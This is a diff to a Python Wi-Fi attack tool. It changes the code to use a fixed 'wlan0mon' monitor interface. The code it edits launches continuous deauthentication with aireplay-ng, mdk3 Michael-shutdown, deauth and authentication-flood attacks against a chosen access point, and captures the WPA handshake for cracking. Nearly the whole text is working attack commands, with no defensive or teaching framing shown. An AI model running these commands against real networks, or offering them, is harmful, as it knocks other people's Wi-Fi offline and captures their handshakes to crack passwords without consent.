@@ -75,9 +75,9 @@ elif(attack == __method__[1]):
 	network_interface=raw_input("What network interface are you using: ")
 	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
 	
-	os.system('iwconfig %s channel %s ' % (network_interface, choice.channel))
+	os.system('iwconfig wlan0mon channel %s ' % (choice.channel))
 	os.system('clear')
-	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, network_interface), 'green', attrs=['bold'])
+	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
 	
 	for char in network_info:
 		sleep(0.05)
@@ -91,16 +91,16 @@ elif(attack == __method__[1]):
 		sys.stdout.write(char)
 		sys.stdout.flush()
 
-	os.system("xterm -hold -fg red -e aireplay-ng --deauth 0 -a %s %s" % (choice.address, network_interface))
+	os.system("xterm -hold -fg red -e aireplay-ng --deauth 0 -a %s wlan0mon" % (choice.address))
 elif(attack == __method__[2]):
 	network_interface=raw_input('What network interface are you using: ')
 
 	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
 	
-	os.system('iwconfig %s channel %s ' % (network_interface, choice.channel))
+	os.system('iwconfig wlan0mon channel %s ' % (choice.channel))
 	os.system('clear')
 
-	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, network_interface), 'green', attrs=['bold'])
+	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
 	
 	for char in network_info:
 		sleep(0.05)
@@ -109,16 +109,16 @@ elif(attack == __method__[2]):
 	
 	keyboard.wait('enter')
 
-	os.system('xterm -hold -fg red -e mdk3 %s m -t %s' % (network_interface, choice.address))
+	os.system('xterm -hold -fg red -e mdk3 wlan0mon m -t %s' % (choice.address))
 elif(attack == __method__[3]):
 	network_interface=raw_input('What network interface are you using: ')
 
 	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
 	
-	os.system('iwconfig %s channel %s ' % (network_interface, choice.channel))
+	os.system('iwconfig wlan0mon channel %s ' % (choice.channel))
 	os.system('clear')
 	
-	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, network_interface), 'green', attrs=['bold'])
+	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
 	
 	for char in network_info:
 		sleep(0.05)
@@ -127,7 +127,7 @@ elif(attack == __method__[3]):
 	
 	keyboard.wait('enter')
 
-	os.system('xterm -hold -fg red -e mdk3 %s d -t %s' % (network_interface, choice.address))	
+	os.system('xterm -hold -fg red -e mdk3 wlan0mon d -t %s' % (choice.address))	
 elif(attack == __method__[4]):
 	network_interface=raw_input('What network interface are you using: ')
 
@@ -135,7 +135,7 @@ elif(attack == __method__[4]):
 	
 	os.system('clear')
 	
-	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, network_interface), 'green', attrs=['bold'])
+	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
 
 	for char in network_info:
 		sleep(0.05)
@@ -144,7 +144,7 @@ elif(attack == __method__[4]):
 
 	keyboard.wait('enter')
 
-	os.system('xterm -hold -fg red -e mdk3 %s a -a %s -m' % (network_interface, choice.address))
+	os.system('xterm -hold -fg red -e mdk3 wlan0mon a -a %s -m' % (choice.address))
 elif(attack == __method__[5]):
 	network_interface=raw_input('What network interface are you using: ')
 
@@ -163,7 +163,7 @@ elif(attack == __method__[5]):
 
 	keyboard.wait('enter')
 
-	os.system('xterm -hold -fg red -e aireplay-ng -0 0 -a %s -c %s %s' % (choice.address, bssid, network_interface))
+	os.system('xterm -hold -fg red -e aireplay-ng -0 0 -a %s -c %s wlan0mon' % (choice.address, bssid))
 elif(attack == __method__[6]):
 	network_interface=raw_input('What network interface are you using: ')
 
@@ -171,7 +171,7 @@ elif(attack == __method__[6]):
 	
 	os.system('clear')
 
-	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nPress ENTER to capture handshake'.format(choice.ssid, choice.address, choice.channel, network_interface), 'green', attrs=['bold'])
+	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to capture handshake'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
 	for char in network_info:
 		sleep(0.05)
 		sys.stdout.write(char)
@@ -179,7 +179,7 @@ elif(attack == __method__[6]):
 
 	keyboard.wait('enter')
 	
-	os.system('airodump-ng -c %s --bssid %s -w capture %s & xterm -fg red -e aireplay-ng --deauth 0 -a %s %s' % (choice.channel, choice.address, network_interface, choice.address, network_interface))
+	os.system('airodump-ng -c %s --bssid %s -w capture wlan0mon & xterm -fg red -e aireplay-ng --deauth 0 -a %s wlan0mon' % (choice.channel, choice.address, choice.address))
 	
 	def crackHandshake():
 		os.system('clear')
@@ -187,7 +187,7 @@ elif(attack == __method__[6]):
 		
 		os.system('clear')	
 
-		handshake_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nHandshake: WPA[{}]\n'.format(choice.ssid, choice.address, choice.channel, network_interface, choice.address), 'green', attrs=['bold'])
+		handshake_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nHandshake: WPA[{}]\n'.format(choice.ssid, choice.address, choice.channel,choice.address), 'green', attrs=['bold'])
 
 		for char in handshake_info:
 			sleep(0.05)
